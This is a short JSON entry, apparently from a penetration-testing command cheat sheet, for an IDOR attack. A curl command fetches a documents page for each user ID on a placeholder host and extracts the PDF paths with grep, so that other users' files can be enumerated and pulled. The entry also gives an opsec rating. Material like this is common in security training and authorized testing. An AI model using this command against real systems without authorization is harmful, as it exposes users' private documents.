      "name": "IDOR - Extract Object Links with cURL",
      "command": "curl -s \"http://<ip>:<port>/documents.php?uid=<uid>\" | grep -oP \"\\/documents.*?.pdf\"",
      "description": "Fetches a page for a given uid and regex-extracts the object links (file paths) from the HTML, giving the list of resources to pull for each enumerated user.",
      "opsec": "moderate",
